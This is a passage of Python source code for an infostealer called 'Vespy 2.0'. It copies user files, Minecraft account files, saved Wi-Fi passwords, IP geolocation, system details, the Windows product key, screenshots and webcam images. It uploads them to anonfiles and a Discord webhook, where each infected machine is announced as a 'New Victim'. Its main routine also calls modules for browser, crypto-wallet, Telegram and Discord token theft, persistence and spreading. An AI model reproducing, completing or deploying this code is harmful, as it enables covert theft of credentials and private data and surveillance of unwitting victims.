                                        shutil.copy(_+"\\"+f,self.PTHAY+"\\"+fname+f"_{randint(1,999)}."+fext)
                                except:pass
        except:pass
    
    def upload_send(self):
        shutil.make_archive(f"C:\\Users\\{user}\\AppData\\Files","zip",f"C:\\Users\\{user}\\AppData\\Files")
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Files.zip","rb")})
        link = file.json()['data']['file']['url']['full']
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"File Grabber", description=f"User's File Grabbed", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        meowhehe = f""":open_file_folder: ``Files.zip``
``|_``:page_facing_up: ``({self.files}) Files Grabbed``
        """
        embed.add_embed_field(name=meowhehe, value=f"\n\n:file_folder: **ZIP with Grabbed files** : \n**{link}**")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(f"C:\\Users\\{user}\\AppData\\Files.zip");shutil.rmtree(f"C:\\Users\\{user}\\AppData\\Files")
class Minecraft:

    def __init__(self):
        try:
            self.files = 0
            os.mkdir(os.path.join(P4THF0LDR, "Minecraft"))
            self.minecraftfolder = os.path.join(P4THF0LDR, "Minecraft")
            path = f"C:\\Users\\{user}\\AppData\\Roaming\\.minecraft"
            self.Minycrafty(path)
        except:
            pass
    
    def Minycrafty(self, path):
        logs = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
        for i in logs:
            shutil.copy(path+"\\"+i,self.minecraftfolder+"\\"+i)
            self.files +=1
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Minecraft``
``|   |_``:page_facing_up: ``({self.files}) Minecraft Files``"""
class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{con['ip']}``"
        try:
            self.hostname = f"``{con['hostname']}``"
        except:self.hostname = ":x:"
        try:
            self.city = f"``{con['city']}``"
        except:
            self.city = ":x:"
        try:
            self.region = f"``{con['region']}``"
        except:
            self.region = ":x:"
        try:
            self.country = f"``{con['country']}``"
        except:
            self.country =":x:"
        try:
            self.location = f"``{con['loc']}``"
        except:
            self.location = ":x:"
        try:
            self.ISP = f"``{con['org']}``"
        except:
            self.ISP = ":x:"
        try:
            self.postal = f"``{con['postal']}``"
        except:
            self.postal = ":x:"

    def WiFi(self):
        self.IP()
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":ok_hand: IP : {self.ip}", value=f":label: Hostname: {self.hostname}\n:cityscape: City: {self.city}\n:park: Region: {self.region}\n:map: Country: {self.country}\n:round_pushpin: Location: {self.location}\n:pager: ISP: {self.ISP}\n:envelope: Postal: {self.postal}")
        webhook.add_embed(embed)
        webhook.execute()
        try:
            networks = re.findall("(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info (MORE)", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                embed.add_embed_field(name=f":thumbup: Wifi Network Found : ``{nets}``", value=f":man_tipping_hand: SSID: ``{ssid}``\n:scream: Password: ``{key}``")
                webhook.add_embed(embed)
                webhook.execute()
        except:pass
class Antidebug:
	pass
class AntiVM:
	pass
class Hide:
	pass
class N3ke:
	pass
class Reboot:
	pass
class Cl1ppa:
	pass
class Startup:
	pass
class ErrorMsg:
	pass
class Spread:
	pass
class Screeny:

    def __init__(self):
        jtjirjihirthr = True
        try:
            r=self.Screen()
        except:
            pass
        self.Info()
        if jtjirjihirthr:
            content = "@everyone New Hit"
        else:
            content = "New Hit"
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png",content=content)
        embed = DiscordEmbed(title=f"New Victim", description=f"New victim | Pc Info + Screenshot", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        try:
            t=requests.get(r)
            if t.status_code == 200 or t.status_code == 204:
                embed.set_image(url=r)
        except:
            pass
        embed.add_embed_field(name=f":desktop: Logged : ``{self.user}``", value=f"\n:fax: Machine : ``{self.machine}``\n:gear: System : ``{self.system}``\n:control_knobs: Processor : ``{self.processor}``\n\n\n:floppy_disk: **Virtual Memory**\n:battery: Total : ``{self.TotalM}``\n:alembic: Available : ``{self.availableM}``\n:low_battery: Used : ``{self.usedM}``\n:symbols: Pourcentage : ``{self.pourcentageM}``\n\n\n:id: HWID : ``{self.hwid}``\n:key: Windows Product Key : {self.windowspk}")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove("testy.jpg")
        try:
            camera.init()
            camlist = camera.list_cameras()
            if camlist:
                cam = camera.Camera(camlist[0], (640, 480))
                cam.start()
                image = cam.get_image()
                pygame.image.save(image, "webcam.jpg")
                file = requests.post('https://api.anonfiles.com/upload',files={'file':open("webcam.jpg","rb")})
                link = file.json()['data']['file']['url']['full']
                r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Webcam", description=f"Webcam Captured", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                try:
                    t=requests.get(r)
                    if t.status_code == 200 or t.status_code == 204:
                        embed.set_image(url=r)
                except:
                    pass
                webhook.add_embed(embed)
                webhook.execute()
                os.remove("webcam.jpg")
        except:
            pass
    
    def Screen(self):
        s = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        s.save("testy.jpg")
        s.close()
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open("testy.jpg","rb")})
        link = file.json()['data']['file']['url']['full']
        r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
        return r
    
    def Size(self,b):
        for unit in ["", "K", "M", "G", "T", "P"]:
            if b < 1024:
                return f"{b:.2f}{unit}B"
            b /= 1024

    def Info(self):
        self.user = user
        self.machine = platform.machine()
        self.system = platform.system()
        self.processor = platform.processor()
        self.sv = psutil.virtual_memory()
        self.TotalM = self.Size(self.sv.total)
        self.availableM = self.Size(self.sv.available)
        self.usedM = self.Size(self.sv.used)
        self.pourcentageM = self.Size(self.sv.percent)+"%"
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid',creationflags=subprocess.CREATE_NO_WINDOW)).replace(" ","").split("\\n")[1].split("\\r")[0]
        try:
            self.windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey',creationflags=subprocess.CREATE_NO_WINDOW).decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
            for i in self.windowspk:
                if len(i) > 20:self.windowspk = i.split(" ")
            self.windowspk= f"``{self.windowspk[0][3:]}``"
        except:
            self.windowspk = ":x:"


def zipette():
    shutil.make_archive(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"),'zip',os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
def main():
    Antidebug()
    AntiVM()
    Startup()
    Hide()
    Thread(target=ErrorMsg).start()
    Thread(target=Cl1ppa).start()
    Screeny()
    content = f":open_file_folder: ``GRABBED_{user}``"
    content += str(Browsers())
    content += str(Roblox())
    content += str(EXodus())
    content += str(Minecraft())
    content += str(Telegram())
    content += "\n``|_ END``"
    zipette()
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
    webhook.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}.zip"),'rb').read(),filename=f"GRABBED_{user}.zip")
    webhook.execute()
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
    embed = DiscordEmbed(title=f"Info Grabbed of user : ``{user}``", description=content, color='4300d1')
    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
    embed.set_footer(text='Vespy 2.0 | by : vesper')
    embed.set_timestamp()
    webhook.add_embed(embed)
    webhook.execute()
    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}.zip"));shutil.rmtree(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
    try:
        CookieInfo(rocookies)
    except:
        pass
    DISCORD()
    Thread(target=Injection).start()
    Files()
    Network()
    Spread()
    N3ke()
    Reboot()
main()
